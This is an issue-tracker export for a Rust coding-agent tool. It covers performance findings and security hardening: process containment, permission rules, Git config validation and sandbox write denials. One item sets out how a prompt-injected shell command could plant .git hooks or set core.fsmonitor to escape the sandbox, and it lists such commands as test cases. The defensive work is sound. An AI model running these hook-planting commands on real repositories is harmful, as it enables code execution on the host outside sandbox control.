WHERE: src/ui/mod.rs:1487-1496 (persist_session_if_settled); src/ui/event_handler.rs:228, 244, 267, 279, 428, 455, 608-610; src/session/storage.rs:207-240; src/session/lock.rs publish(); src/fs.rs:2750-2820 (sync_all at 2764, 2817).
HOW: Serialize on the UI task, hand the bytes to a per-session single-flight spawn_blocking writer (latest snapshot wins; take the held.io lock inside the blocking task to keep the lock semantics); keep the synchronous path only for exit and session switch; consider dropping the directory fsync for in-session snapshots (keep it at exit).

title: Each statusline git status refresh pays a full global-snapshot select (extra git process + temp-dir mirror) and always repaints
description:
WHAT: GitRunner::run -> internal_command -> global_snapshot::capture -> GlobalSources::select does runtime.validate(roots) (open + fstat 3 files), creates a new uuid SnapshotDirectory (0700), writes a mirror file per global source plus root, spawns git config --null --includes --show-scope --show-origin --list, parses it, remove_dir_alls the directory, and only then spawns the real git status --porcelain=v2: 2 processes + 3-5 file ops per refresh. run_inner requests this whenever the loop wakes with >= 1 s elapsed, and during a running turn the 100 ms tick guarantees once per second; on arrival apply_git_status_refresh returns true whenever the workspace matches, so refresh() runs even when nothing changed. Complements the polling-cadence bead (which covers the schedule); this one covers the per-refresh cost.

title: Guarded Git runtime is materialized and hashed twice per start, serially before config load
description:
WHAT: main awaits git::global_snapshot::initialize before anything else; it calls GitRunner::discover_guarded() directly (not the CACHED_GIT_RUNNER OnceLock), which materializes the guarded runtime: validate_approval SHA-256s the embedded 8.66 MB payload (already verified at build time by scripts/git_runtime_build.rs), then re-reads and SHA-256s the on-disk copy, chmods, fstat-validates and protects it; GlobalSources::capture then spawns git rev-parse x2 and, per global config source, git config --list + git config --get-regexp (plus git --exec-path for a non-store credential helper). The first statusline git status later calls GitRunner::discover() -> CACHED_GIT_RUNNER.get_or_init(discover_guarded) and repeats the whole materialize/hash. Net ~4 SHA passes over 8.66 MB plus 5-7 git fork/execs (~80-150 ms) serially before any config is read.
WHERE: src/main.rs (global_snapshot::initialize call); src/git/global_snapshot.rs:61-83 (discover_guarded at the initialize body), 100-160 (capture probes); src/git/runner.rs:116-146 (CACHED_GIT_RUNNER); src/git/runtime.rs:452-523 (on-disk hash at 498-500), 566-600 (embedded hash at 592).
HOW: (a) make initialize use GitRunner::discover() or seed CACHED_GIT_RUNNER from the runner it built so materialize runs once per process; (b) memoize validate_approval by approval id or drop the runtime hex_digest of the embedded payload (keep the on-disk proof, which is the containment-relevant one); (c) run initialize's hashing under spawn_blocking and tokio::join! it with config::load_in_workspace / context::load / docs::ensure_global (read-only; the EFFECTS_STARTED guard only needs to precede hooks, MCP and project effects); (d) run the git config probes per source and the rev-parse pair concurrently.
VERIFY: tracing spans around initialize and discover(); count git child spawns per start (fs_usage -w | grep execve or a test counter in git::runner tests); tests/headless_json.rs startup_commands_run_with_the_windows_default_stack_budget stays green (keep heap_future boxing); global_snapshot and runner unit tests; tests/git_runtime_build.rs.

title: Foreground shell output is invisible until the child exits: stream throttled progress to the TUI
description:
WHAT: ShellTool awaits a single response_rx value that the worker sends only after captured.finish(), so latency to the first visible byte equals the full command duration (default deadline 120 s, max 600 s). Every long build or test run looks hung; SharedCommandCapture already has snapshot() but it is only used for background jobs.

HOW: Pass a tokio::sync::watch::Sender<usize> (bytes captured) or a bounded mpsc<Bytes> in OutputCommandOptions, publish from spawn_bounded_pipe_reader after each push, and have ShellTool forward a throttled (~100 ms) AgentEvent::ToolProgress { id, text } to the TUI, rendered through the same sanitize_output path as ! output under the anchored tool-call line; the final ToolResult stays byte-identical and the model sees only the final result.

title: wrap_command (including the .git pin scan) runs synchronously on the async executor and, for !, on the UI task
description:
WHAT: The Git-metadata hardlink/symlink pin scan (openat O_NOFOLLOW + fstat per protected entry, recursive readdir of .git/hooks, info and modules up to 4096 entries, depth 16) runs on every launch by design and must not be cached. title: Seatbelt profile cache recomputes its whole fs-derived key on every command, so a hit only skips string formatting
description:
WHAT: get_seatbelt_profile runs, before the HashMap lookup, on every shell tool call, every ! command and every sandboxed hook launch: validate_workspace_aliases (the .git pin scan, which must stay per launch), general_profile::private_paths, seatbelt_private_read_denies (canonicalize per path), seatbelt_write_denies, protected_runtime_paths (global lock + validate each), general_profile::roots twice (a fresh WorkspaceBinding::capture = canonicalize + open + cap_std open + 2 metadata per configured read/write root), extra_reads/extra_writes, and seatbelt_namespace_denies twice (canonicalize + O(n^2) names.contains). title: MCP source revalidation re-reads, re-hashes and re-parses config files synchronously on the executor twice per tool call
description:
WHAT: Every MCP tool call runs ensure_client_current before the permission ask and again right before RPC. ServerSourceProof::is_current -> FileSnapshot::read performs WorkspaceBinding::validate (canonicalize + 2 metadata) twice, opens and fully reads the config file twice, SHA-256s it twice (matches_file), reads and JSON-parses the trust store, and for a global-config origin TOML-parses the whole global config, all synchronously on a tokio worker. With concurrent calls (tools::concurrency::bind) Handler::enter additionally runs current() on every other live lease under the lease mutex, so the k-th call pays k-1 extra full re-reads. The security contract (a revoked or changed source must refuse RPC, both before the ask and after permission/hook waits) must be preserved; only its cost should change.
WHERE: src/extras/mcp/tool.rs:211, 244, 250-252; src/extras/mcp/project.rs:293-301, 344-402 (is_current), 156-247 (authority.current, up to 4 files + parse_config_content), 832-900 (FileSnapshot::read: validate at 836 and again at the end, open/read/hash twice); src/paths.rs:905-932; src/config/load.rs:4727-4740, 1886-1908 (trust store); src/extras/mcp/elicitation.rs:96-121 (enter retains with lease.current()).
HOW: Make revalidation metadata-first: cache (identity, len, mtime, digest) per origin file in the proof and re-read + re-hash only when checked_file_metadata differs (identical semantics when content changed, since a changed file changes len/mtime/identity; keep a forced full re-read fallback when metadata is unavailable); call WorkspaceBinding::validate once per is_current rather than once per FileSnapshot::read; parse the trust store once per is_current. Keep both ensure_client_current calls. If a full re-read remains on some path, run it under spawn_blocking so it cannot stall the executor. In Handler::enter retain on lease.upgrade().is_some() and keep the current() filter in unique() where elicitation needs it.

title: FilePicker::filter lowercases every cached path per keystroke and per 50 ms walk tick (up to 20k entries)

WHAT: Each filter does p.to_string_lossy().to_lowercase() for every cached path (1-2 heap allocations x file_cache.len(), up to MAX_WALK_FILES = 20 000 plus directories). It runs on every char_input/backspace, on every try_finish_loading poll that received a batch (every 50 ms during the walk, so total work is quadratic in the walk), and again from draw.

title: An open picker forces a full chat repaint every frame (per keystroke and 20x/s during the @ walk)
description:
WHAT: refresh_display calls renderer.invalidate() after drawing an active picker so the next frame repaints the entire chat viewport, not just the overlay rows. With per-row flushing one keystroke in /, @, /model or ! pickers costs ~rows write syscalls plus a full bottom redraw; while the @ walk streams, the 50 ms poll branch calls refresh() on every batch, i.e. 20 full-screen repaints per second for the duration of the walk.

title: render_viewport repaints every visible row on any change: diff rows and scroll instead of full rewrite
description:
WHAT: Any feed mutation (one streamed token, one new line, a selection drag, a one-line scroll) marks the chat dirty and render_viewport rewrites all visible rows (MoveTo + colors + text + Clear(UntilNewLine) + ResetColor per row). During streaming only the last one or two rows change; when a line is appended while auto-scrolling, the terminal could scroll the region up by one and only the new row needs painting. Output volume per paint is therefore proportional to the viewport instead of to the change, which is what makes streaming feel heavy on wide terminals and over SSH.
WHERE: src/ui/renderer.rs:1455-1557 (render_viewport), 1064-1093 (chat_snapshot/chat_needs_redraw only tracks whole-viewport state), 140-146 (LineEntry), src/ui/feed.rs:279-331 (FeedLines segments are Arc'd, so row identity is cheap to compare).
HOW: Keep the last painted frame as Vec<(row_key, selection_range)> where row_key is (Arc::as_ptr(segment), index) or a hash of text+color+spans. On paint, compute the new visible rows; if the new start index equals old start + k with k small and auto-scrolling, emit ScrollUp(k) on a scroll region covering the chat area and paint only the k new rows; otherwise paint only rows whose key or selection changed. Fall back to full repaint on width/visible-rows change, chat_bg/monochrome change, or after an overlay (invalidate()).
VERIFY: Renderer tests with captured_output(): stream 200 tokens into a running Agent block and assert the captured bytes per paint are bounded by a constant times the changed rows, not by visible rows; scroll-by-one emits one row; selection drag emits only rows in the old/new selection span; existing feed/renderer tests stay green.

title: Frame output flushes per row and locks stdout per write: buffer each frame and emit it in one write
description:
WHAT: Every chat row, input row and status row is painted with stdout.execute(MoveTo(..)) followed by several write!(stdout, ..) calls on io::Stdout. crossterm's ExecutableCommand::execute is queue + flush (patched-deps/crossterm/src/command.rs:178-182), so a 45-row viewport issues 45+ write(2) syscalls per paint, and each write! on io::Stdout takes the Stdout reentrant mutex. During streaming this happens up to 25 times per second (see the streaming-throttle bead), and on SSH/slow terminals partially written frames tear because no synchronized-update bracket is used.
WHERE: src/ui/renderer.rs:1455-1557 (render_viewport: execute(MoveTo) at 1489,1500,1532 and 6 write! per row), 1941-2160 (draw_bottom: execute at 1993,2095,2149), 1663-1680 (draw_separator), 1642-1661 (clear_shrunk_rows), 1715-1811 (draw_statusline_row: two execute per row), 2174-2205 (tick_spinner), 1927-1939 (restore_bottom_cursor), src/ui/pickers/mod.rs and file.rs/models.rs picker overlays (grep .execute().
HOW: Give Renderer a frame buffer (Vec<u8> or String reused across frames). Replace every execute()/write!(stdout) in the paint paths with queue!/write! into the buffer, then write_all + flush once per frame on a locked handle (stdout().lock()). Wrap the frame in crossterm BeginSynchronizedUpdate/EndSynchronizedUpdate (DEC 2026; terminals that ignore it are unaffected). Keep the test writer path (TestOutput) working by writing the same buffer to it.
VERIFY: In the App/Renderer tests with captured_output(), count flushes (add a flush counter to TestOutput) and assert one flush per render_viewport/draw_bottom; existing renderer tests (uncaptured_bottom_draw_preserves_native_geometry_errors and the captured-output assertions) stay green; cargo test --bin mini-agent -- renderer feed picker.

title: Release profile is opt-level=z and dev deps are opt-level 0: text pipeline runs unoptimized
description:
WHAT: Cargo.toml [profile.release] uses opt-level = "z" (size), and [profile.dev] opt-level = 0 applies to every dependency, so the development binary that CLAUDE.md installs (cargo install --path . --debug, 154 MiB) runs regex, pulldown-cmark, unicode-width, crossterm, compact_str and tokio fully unoptimized. docs/benchmarks/2026-10-15-startup-profile-pair.md measured warm user-CPU 437 ms (debug) vs 103 ms (release) for the same work. Every per-frame cost in the renderer is paid 4-10x in the binary developers actually run, and opt-level z is measurably slower than 3 for the same text-heavy code paths in the shipped binary.
WHERE: Cargo.toml:231-233 ([profile.dev] opt-level = 0), 245-258 (per-package overrides already exist for sha2/matrixmultiply/hnsw_rs/anndists, proving the pattern), 260-265 ([profile.release] opt-level = "z", lto = "thin", codegen-units = 1).
HOW: (1) Add [profile.dev.package."*"] opt-level = 1 (or 2) so dependencies are optimized while the mini-agent crate itself stays at 0 for fast incremental builds and inspectable debugging; keep the existing explicit overrides. (2) Change release to opt-level = 3 (or at least "s") and re-measure binary size; thin LTO stays. (3) Record the before/after in docs/benchmarks.
VERIFY: time cargo install --path . --debug before/after (incremental rebuild of the app crate must not get slower); tests/headless_json.rs startup_commands_run_with_the_windows_default_stack_budget keeps passing under ulimit -s 1024 with --all-features (frame sizes change with opt-level); rerun docs/benchmarks/2026-10-15-startup-profile-pair.py and the streaming paint timing test from the instrumentation bead.
close_reason: 115265dd on main: [profile.dev.package."*"] opt-level=1 (app crate stays 0), release opt-level=3 with thin LTO/1 CGU. Verified: all-features stack-budget test startup_commands_run_with_the_windows_default_stack_budget passes under the new profile.

title: TUI performance review 2026-10-15: make the interface snappy (rendering, input, streaming, startup, subagents, MCP, shell)
description:
Performance review of the TUI on 2026-10-15 (main at 57cd38c2) asking: why is the interface not as snappy as it could be, and what concrete changes make typing, streaming, pickers, startup, exit, subagent delegation, MCP calls and shell commands faster. Method: own read of the render/feed/event-loop core plus six parallel read-only area reviews (text pipeline: highlight/markdown/wrap/statusline; input/pickers/slash; startup/idle/teardown; subagent communication; MCP handling; shell/bash/sandbox). Every cited line was spot-checked against the source before filing. 66 children (P1 15, P2 31, P3 19, P4 1), label tui-perf-2026-10-15 with sub-labels mcp, subagents, shell, startup; each has WHAT / WHERE (file:line at 57cd38c2) / HOW / VERIFY and names the existing tests that pin behaviour.

Headline causes: (1) the binary developers run is opt-level 0 for every dependency and the release profile is opt-level z; (2) each frame is written with one flush per row (crossterm execute = queue + flush) and the viewport is fully rewritten on any change; (3) streaming repaint throttling is bypassed by reasoning deltas and newline tokens, and the tail tick never fires during a burst; (4) pickers force full repaints and the @ walk lowercases every cached path per keystroke/tick; (5) idle work sits on the UI task: git status (with a global-snapshot git config probe and temp-dir mirror) every second, custom-command and MCP source re-reads on /, a 10 ms Enter peek; (6) startup serially materializes and hashes the guarded Git runtime twice, awaits SessionStart hooks, skills hashing and a 150 ms OSC-11 wait before the first frame, and the turn-end save fsyncs twice on the UI task; (7) MCP source revalidation re-reads/hashes/parses config twice per tool call; (8) subagent fan-out repeats agent construction per child and serializes the full prepared request twice per child turn; (9) wrap_command canonicalizes 3-4 times and rebuilds the whole seatbelt cache key per command, on the UI task for !, and foreground shell output is invisible until exit.

Security caveats carried in the beads: never cache the .git alias/identity validation (sandbox) or the MCP source-revocation check; make them cheap or move them off the UI/executor thread; preserve the Phase 6 checklist in docs/specs/phase-6-brokered-js-runtime.md.

Suggested order: the instrumentation bead (paint/byte/flush counters + streaming timing test) first as the verification foundation, then the P1 beads (profiles, frame buffer + synchronized output, row diffing, picker repaint, file picker filter, git runtime double materialize, per-refresh git select, SessionStart join, turn-end save, MCP revalidation x2, seatbelt key, write roots, wrap_command off-thread, shell streaming), then P2 throttling/coalescing/lazy-layout/startup beads, then the P3 allocation hygiene.

design:
# Windows foreground descendant ownership (.108)

Evidence is exact7f7 native red, not a fixture timeout: GH4 pass, cancellation reaches helper PID6972, receiver closes but retained descendant remains runnable. The private trust fixture repair is independent.

## Authority and scope

Only Windows general command execution with explicitly Disabled sandbox needs the new owner. It grants no filesystem/network authority, changes no permission Ask, and must not become a fallback for RequiredButUnavailable or launch a JS worker. Parent-created broker spawn uses the general path; the broker-only worker launcher and existing AppContainer helper remain unchanged. Start with captured output commands, then audit status/support and registered background callers using the same owner so kill_active cannot settle only their leader.

## Construction and settlement

1. Establish a local RAII kill-on-close Job before spawning, with neither breakaway flag. Keep the process-creation guard around spawn/association/resume; no new ambient/global registry. Each command owner retains its exact Job and process handles.
2. Spawn the already-authorized, already-configured Tokio Command with CREATE_SUSPENDED. Preserve its existing argv, environment scrub, bound cwd, stdio and flags; do not rebuild command text in an external helper. Assign the retained suspended process to the Job, verify membership/limits, check captured cancellation, register the exact owner, then resume. Any construction/association/query/resume failure terminates and reaps the still-suspended process and closes all handles, returning closed failure. No post-spawn running-child adoption or direct-child-only fallback.
3. The stable Tokio/standard Child APIs expose the process handle but not the primary thread handle (Rust ChildExt::main_thread_handle is nightly). Existing process-wrap uses a suspended Command plus ToolHelp/OpenThread/ResumeThread, but its error/resource handling and zero-thread success are insufficient as-is. A narrow owned equivalent may require exactly one initial thread owned by the retained process, retain its handle and recheck thread ownership; ResumeThread must observe the expected suspension count. No broad process enumeration or best-effort resume. If that condition is not supportable, use a dedicated native CreateProcessW adapter retaining PROCESS_INFORMATION rather than claiming the wrapper safe. This API choice needs parent review before implementation.
4. Scope owner registration to the existing Sandbox instance's active command collection, using retained Job capabilities (not PID-only inferred family), so kill_active explicitly terminates the exact family. The command future remains owned by AgentWorkScope. Normal leader exit also ends/drains descendants before pipe joining and terminal audit/accounting. Cancellation, deadline, reader error, receiver drop and unwind terminate Job, reap leader, prove active Job processes zero under existing drain budget, then publish terminal result.
5. A failed drain must not expose a successful complete ForegroundResult or settlement proof; keep the exact owner retained through teardown. Drop closes the kill-on-close Job and cleans the exact child, with no detached waiter. No new deadline extension; all setup/cancellation work consumes the existing command budget.

## Minimal evidence

Keep existing native GH5 and exact ordinary Ask test byte-for-byte in policy/assertions/deadlines. Add native test-only inert controls for suspend/assign/resume failure, cancellation before resume, immediate descendant creation and leader exits before descendant, receiver drop/unwind; retain exact child handles and assert no late effect before release. Scope Windows discovery to these necessary owning controls, no full suite. Mac feature/cfg gates prove no affected Unix behavior but cannot prove Windows launch semantics. Preserve the exact7f7 failure artifact and report hosted native gap until fresh Windows passes.

Primary references: Microsoft AssignProcessToJobObject (nested Job requirements), Process Creation Flags (CREATE_SUSPENDED), Job Objects (no-breakaway inheritance), and Rust stable ChildExt API. The proposed thread capture does not claim parent-crash atomic assignment; if that is part of required settlement, PROC_THREAD_ATTRIBUTE_JOB_LIST at CreateProcess time is preferable and must be explicitly reviewed.

Do not reuse a path-check followed by fs/private atomic_write or windows_rename_open_file_relative(replace=true) as CAS. The latter (src/fs.rs:2115) supplies a destination name, not expected identity/content; POSIX open-file replacement still has no expected-object operand. ReplaceFileW also documents intermediate failure states and is not an identity-conditioned replacement.

Preferred narrow candidate for investigation: a separate explicit operator-private-config transaction, not generic model/workspace replacement. Acquire one directory-relative no-follow existing destination handle with read/write access and ShareMode=0. Validate exact captured directory/workspace, file identity, content digest, current owner/protected private DACL, regular type and single link AFTER acquiring exclusive access, and retain it through mutation. Sharing conflict is an ordinary bounded fail-closed conflict, not a reason to reopen permissively. A write mapping must also prevent exclusive acquisition (documented CreateFileW contract); prove this natively rather than assume it.

Before changing bytes, durably publish a bounded private transaction record containing approved old bytes/new bytes, exact root/parent/file identity, target leaf, operation ID, hashes and schema. Such secret bytes must never reach notices/Doctor/model history. Validate/serialize only structural one-entry edits; unavailable/unrelated values remain preserved. Use retained-handle in-place write/truncate + sync, then complete the journal state, so the namespace remains present and readers cannot newly open it during the owned exclusive lease. This is an operator-specific recoverable update, not a claim of atomic rename/CAS for arbitrary readers. Existing mappings/hardlink creation/parent replacement behavior and all reader fallback paths require native controls before accepting this candidate.

Crash/recovery is a gating design requirement: all application config readers (including feature-off global readers and initial MCP launch) must fail closed on a matching unresolved transaction, rather than parse partial bytes or substitute defaults that drop owner budget/privacy/MCP disables. Recovery acquires the same strict lease/identity again. Complete old/new exact states can be classified; unknown/partial/foreign content, identity changes, public ACLs, hardlinks or malformed journals must obstruct and preserve recovery data, never blindly overwrite/delete. An explicit operator recovery review may restore known backup bytes after reviewing the conflict; no imported/serialized trust or tool grant is fabricated. Cancellation after mutation starts must own settlement/rollback before admission or shutdown continues.

Alternative: same-handle no-replace retirement to a private backup then no-replace publication, with an authoritative transaction marker and rollback. It avoids ambient source rename races but introduces a missing-name window, so it requires a loader barrier even on feature-off builds and cannot claim invisible atomic replacement. Prefer neither approach until native race/crash controls prove its actual guarantees. No fallback that relaxes standard workspace exchange.

title: Canonicalize top-level permission aliases so fetch/todo deny rules cannot miss actual effects
description:
WHAT
Top-level permission-allow, permission-ask, and permission-deny accept schema aliases fetch and write_todo_list, but the checker inserts those raw names without mapping to the actual permission keys js/fetch and todo_write. This silently discards explicit deny rules at the real effect boundary. Nested permission objects already canonicalize these names via PermissionConfig serde aliases.

CONTROLLED EVIDENCE
At main/base 1cae4f2: Config::build_permission_config validates aliases through permission::is_configurable_tool_name. PermissionChecker::merge_entries (currently nested in new_for_sandbox on main) appends only permission_tool_aliases(tool). That function handles shell/bash, read and write, but not fetch or write_todo_list. canonical_permission_tool only maps bash to shell. Therefore Config permission-deny = { write_todo_list = ["*"] } compiles successfully, yet check("todo_write", "[]") returns Allowed before mode resolution; a TodoWriteTool effect is not blocked. permission-deny = { fetch = ["https://example.test/**"] } in Yolo likewise fails to deny check("js/fetch", "https://example.test/path"). In contrast canonical map keys deny both calls. During .39 isolated tests, an allow seed using fetch initially returned Ask for actual js/fetch, confirming this exact mapping gap; .39 now canonicalizes only CLI seed keys and does not repair existing config behavior.

WHERE
src/permission/mod.rs configurable keys and PermissionConfig schema aliases; src/config/mod.rs top-level entry validation; src/permission/checker.rs merge_entries, permission_tool_aliases/canonical_permission_tool; relevant docs and source/checker/tool integration tests.

HOW
Use one authoritative mapping for supported permission tool aliases at top-level entry compilation (and preferably .39 CLI parsing), without normalizing raw pattern strings/MCP identities or weakening deny precedence, path identity/external_directory baselines, shell exact/prefix distinction, or mode semantics. Preserve builtin todo behavior except that explicit denies must block it.

VERIFY

Assert alias denies at actual TodoWriteTool effect boundary leave TodoStore unchanged. For fetch, prove canonical and alias deny before transport/network effect using an owning local fixture or actual shared host permission gate. Include nested-vs-top-level parity, duplicate canonical+alias conflicting entries with deny winning, invalid-key validation and persisted serialization aliases. No main changes until current parent gates complete.

title: Tool-result spill hook truncates every result over 12k chars regardless of the tool's own budget, and the saved-output pointer cannot be read in headless mode
description:
WHAT: `ToolResultSpillHook` (src/agent/runner.rs:93-160, registered on the main agent in src/agent/builder.rs ~883) rewrites any tool result longer than `TOOL_RESULT_SAVE_THRESHOLD = 12_000` chars (src/session/mod.rs:14) into 2_000 head chars + 8_000 tail chars + the notice "[full output saved to: <path>; use the read tool on this path to inspect the complete output]" (session/mod.rs:1843-1879). It does not exempt any tool. Consequences:
  - `read` advertises max_read_lines = 2000 (src/config/mod.rs:778) and 1 MiB, but a ~400-line file (~16k chars) comes back as ~50 head lines + ~200 tail lines with the middle silently gone; read's own "[truncated … re-call with offset]" hint never appears because read did not truncate, so the model has no offset to continue from.
  - `shell` (max_bash_output_lines = 2000) and `grep` (150 results x 500 chars) are likewise capped at 12k chars, not at their documented limits.
  - The spill file lives under the session directory (`tool_output_dir(session_id)`, src/session/storage.rs:118-139), which `is_external_path` (src/permission/checker.rs:1343) classifies as outside the workspace; grep finds no grant for tool_output_dir in src/permission. In standard mode an external read is Ask; headless passes `ask_tx: None` (src/startup.rs ~830) so the `read` of the pointer returns "Permission denied (non-interactive mode)". In the TUI it raises a permission prompt for mini-agent's own cache file.
  - `ReadTracker::record_read` runs inside `read` before the hook rewrites, so re-reading the same range is refused ("already read … Reuse the earlier result") although the earlier result was truncated.
Claude Code's equivalent (~25k-token cap with a readable spill, per bd memory harness-best-practice-digest-2026-09) is the top harness win in that digest; this implementation currently loses data instead.

WHERE: src/agent/runner.rs ToolResultSpillHook; src/session/mod.rs TOOL_RESULT_* constants and format_truncated_tool_output; src/permission/checker.rs is_external_path / built-in allows; src/agent/tools/read.rs ReadTracker.

HOW: (1) Exempt self-bounding tools (read, shell, grep, find_files, list_dir, js) from the hook or raise their threshold to their own documented caps; keep the hook for MCP and other unbounded tools. (2) Make the notice tool-aware: for `read` say which lines were dropped and the exact `offset`/`limit` to continue; for shell say the saved path. (3) Add a built-in allow for `read` of the current session's tool_output_dir in the checker (both modes) and a test that headless can read it. (4) Do not record a read in ReadTracker when the hook rewrote the result (or record it as partial).

VERIFY: extend `oversized_tool_result_is_spilled_before_the_next_model_call` (src/agent/runner.rs ~4905) with a `read` result of 400 lines asserting the model sees all lines or a continuation offset; new test in src/tests/headless_ask_tests.rs that `read <tool_output_dir>/<file>` succeeds without an ask channel; `cargo test` green; manual: `mini-agent -p "read src/agent/runner.rs lines 1-400 and count the fn definitions"` returns the full count.
notes: Implementation in shared worktree preserves read/shell/grep/find_files/list_dir/js own limits both before the next Rig model call and in session replay persistence. Current-session immediate regular spill reads use retained WorkspaceBinding, with explicit deny precedence, root identity checks, Unix nonblocking no-follow open, and read-only scope. Main and btw builders bind the current logical session. CONFIG docs updated. Targeted default tests passed: self_bounded (2), tool_output_read_tests (2), headless_ask_tests (2), oversized_tool_result_is_spilled_before_the_next_model_call (1), owned_test_directory_cleans_up_after_panic (1). Newly added fixture roots are RAII-owned. Artifact-disabled guard added afterward clears grant before directory creation; parent integration compile and final review pending. Parent owns close, fmt, install, commit, push and CI.

title: Reject undecodable executable Git configuration before host launch
description: Reproduced host clean-filter execution with a filter subsection containing byte 0xff. There are two bypasses: Git’s locale-sensitive --get-regexp query can omit that executable key entirely, and parse_scoped_config previously decoded returned keys lossily. The delivered fix lists all scoped NUL records, classifies executable key bytes locally, rejects malformed framing and non-UTF8 executable key/value bytes, and preserves non-executable byte values. Real-Git add is refused before index mutation and cannot create the marker; queries use the same probe. The separate post-probe config race remains ew67q.4.
acceptance_criteria: The real non-UTF8 filter fixture cannot create its marker and reports a config error before mutation; malformed/undecodable scope, key and value records fail closed; existing UTF-8 driver and credential behavior remains covered.
notes: Verified default full cargo test: 2889 unit tests + 14 headless + 2 MCP shutdown + 7 worker bootstrap passed, 7 ignored native evidence gates; final focused Git tests 18 default/minimal; subprocess inventory 27; strict all-target Clippy default/minimal/hooks-advisor-lsp-multimodal-pdf; offline locked debug install and --version passed. Evidence /tmp/mini-agent-git-probes-before.log, git-encoding-{full,final-tests,minimal-tests,final-inventory,clippy,minimal-clippy,adapters-clippy,install}.log. Initial parser-only attempt failed because regex skipped key; list/byte classification corrected cause. No claim of native Linux/Windows validation.

title: MCP OAuth callback listener drops legitimate redirects on macOS: accepted socket inherits O_NONBLOCK and an early read returns WouldBlock
description: src/extras/mcp/oauth.rs listen_on_callback_listener sets the TcpListener non-blocking to poll the deadline; on macOS/BSD the accepted TcpStream inherits O_NONBLOCK, so read_request_line's single read() returns WouldBlock whenever the client connected but has not yet sent its request bytes. The error is treated as an unrelated callback: the listener answers 400 and continues, and the real code/denial redirect is lost until the 30 s timeout. Surfaced as the flaky CI failure callback_listener_returns_immediately_when_the_active_login_is_denied on test (macos-latest) in run 36617136132 ('timed out waiting for OAuth redirect'). Fix: set_nonblocking(false) on the accepted stream before applying the read timeout, and read until the end of the request line instead of a single read(). Test: a client that connects, sleeps, then sends the redirect must still be captured.
close_reason: Fixed in 92d1f90: accepted redirect stream is made blocking and the request line is read to its terminator; slow-client regression test fails without the fix.

title: Sandboxed model processes can write .git metadata (config, hooks, info, modules): make it read-only in bwrap/Seatbelt
description:
Defence in depth for the host-side Git escape (see bead 'git-host'). Today nothing denies sandboxed
writes under .git: bwrap `--bind <cwd> <cwd>` (src/sandbox.rs:1884-1890, 2037-2038, 2242) and the
Seatbelt profile `(allow file-write* (subpath workspace) ...)` (src/sandbox.rs:3818-3829). A prompt-
injected shell command can therefore set core.fsmonitor / plant hooks / add filter drivers.
FIX: in every workspace sandbox profile (model command, hook, workspace-service arms) deny writes to
`<git-common-dir>/{config,hooks,info,modules}` and `<gitdir>/config.worktree` (linked worktrees: resolve
the gitfile) for both the configured and the resolved (realpath) spellings: bwrap `--ro-bind` those
paths after the rw bind (create the paths' absence case gracefully: skip when missing), Seatbelt
`(deny file-write* (subpath ...))` rules. Keep normal git operations (add/commit/refs/index/objects)
working inside the sandbox. Optionally also make the write/edit tools `ask` (not allow) for
`.git/config` and `.git/hooks/**` in standard mode.
TESTS: argv/profile unit tests asserting the ro-bind / deny rules are present for a workspace with a
.git dir and for a linked worktree; an #[ignore] real-backend test (run in the `linux-sandbox-policy`
CI job like bound_bwrap_model_process_has_no_authority_fd_or_terminal_stdin) where a sandboxed
`sh -c 'git config core.fsmonitor x'` and `echo > .git/hooks/post-checkout` fail with EPERM while
`git add`/`git commit` still succeed; the Seatbelt equivalent guarded by seatbelt_exists() with a
CI step that fails on 'skipping' output (see the vy77b pattern at ci.yml:821-835).
Preserve the Phase 6 security invariants checklist in docs/specs/phase-6-brokered-js-runtime.md and
document the new rule in docs/specs/phase-2-sandbox.md.
close_reason: Merged cf8d6ef: Git execution metadata (.git/{config,hooks,info,modules}, config.worktree, commondir, gitfile) is read-only in Seatbelt (deny rules after the workspace allow) and bwrap (fd-based --ro-bind-fd/--bind-fd opened beneath the canonical root; requires bwrap >= 0.8, warns otherwise); write/edit/js write ask before touching .git/config or hooks in standard mode; real bwrap (Docker) and Seatbelt tests; ignored bwrap test wired into linux-sandbox-policy. Gaps documented: paths absent at launch under bwrap, zerobox/AppContainer.
